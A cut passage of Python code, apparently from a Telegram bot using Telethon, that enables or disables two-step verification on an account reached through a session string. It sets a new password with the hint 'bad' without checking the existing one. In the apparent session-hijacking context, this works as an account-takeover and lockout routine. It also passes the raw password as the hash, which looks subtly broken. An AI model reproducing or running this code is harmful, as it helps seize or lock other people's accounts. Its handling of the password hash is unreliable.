                    new_settings=ok.types.account.PasswordInputSettings(
                        new_password_hash=password.encode(),
                        hint='bad'
                    )
                ))
                msg = "✅ 𝟸ғᴀ ᴇɴᴀʙʟᴇᴅ!"
            else:
                await bad(ok.account.UpdatePasswordSettingsRequest(
                    password=ok.types.InputCheckPasswordEmpty(),
                    new_settings=ok.types.account.PasswordInputSettings(
                        new_password_hash=b''
                    )
                ))
                msg = "✅ 𝟸ғᴀ ᴅɪsᴀʙʟᴇᴅ!"
            await bad.disconnect()
            return msg
        else:
            return "✅ ᴜsᴇ ᴛᴇʟᴇᴛʜᴏɴ sᴇssɪᴏɴ"
    except Exception as idk:
        err += str(idk)
        return "**❖ ᴇʀʀᴏʀ:** " + err
